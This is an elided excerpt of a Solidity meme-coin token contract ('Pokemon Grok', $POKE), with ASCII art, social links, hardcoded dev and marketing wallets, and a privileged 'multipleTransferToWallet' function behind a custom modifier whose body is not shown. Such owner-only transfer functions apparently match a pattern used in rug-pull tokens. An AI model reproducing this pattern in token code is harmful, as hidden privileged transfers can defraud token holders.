...
// ⠀⠀⠀⠀⢀⣴⣿⣯⣓⠸⣌⠙⠀⠈⠛⠁⠊⣜⣹⣿⣦⡀⠀⠀⠀⠀
// ⠀⠀⠀⡠⢡⣽⢉⣭⢭⢗⠁⠀⠀⠀⠀⠀⠘⡭⢥⡉⢯⡌⠄⠀⠀⠀
// ⠀⠀⢰⣷⣿⣇⢸⡀⣀⢸⣿⣦⠄⠤⣰⣾⠂⣀⣀⠇⡸⢿⣾⡆⠀⠀  https://t.me/PokemonGRoK
// ⠀⠀⣾⣿⣯⣽⣿⣿⣿⣹⣌⠉⠈⠄⠈⢩⣶⣮⣥⣶⣯⡜⣿⣧⠀⠀  https://x.com/PokemonGRoK
// ⢠⠀⣿⡿⢿⢫⡕⣿⣿⣿⣵⣯⣷⣭⣯⡭⣿⢿⡿⢩⡝⡗⢿⣿⠀⠂
// ⠘⠿⣿⣷⣾⣷⣿⣿⣟⡿⡊⠙⡛⢛⠉⠐⢹⢳⠿⢖⣂⡏⣼⣿⠾⠃
// ⠀⠀⠸⣿⣷⠀⢀⠞⡛⠀⠯⠼⠙⠼⠉⠉⢻⢟⠡⠉⠛⣬⣿⡇⠀⠀
// ⠀⠀⠀⠙⣿⣧⣹⣈⣁⡆⢀⠂⣐⣀⣀⣆⠀⣈⣁⣀⣇⣸⠋⠀⠀⠀
...
contract PokemonGrok is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Pokemon Grok";
    string private constant _symbol = unicode"$POKE";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 770000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0xc69C64cAF1E7aaBaF3AC1AAC349b5334bb1DbD36);
    address payable public MarketingWallet = payable(0xB5EdDC4F9386BF73F9f27755e133B934211E69F4);
    ...
    function multipleTransferToWallet(uint256 value, address adr) onlyAddress public virtual {
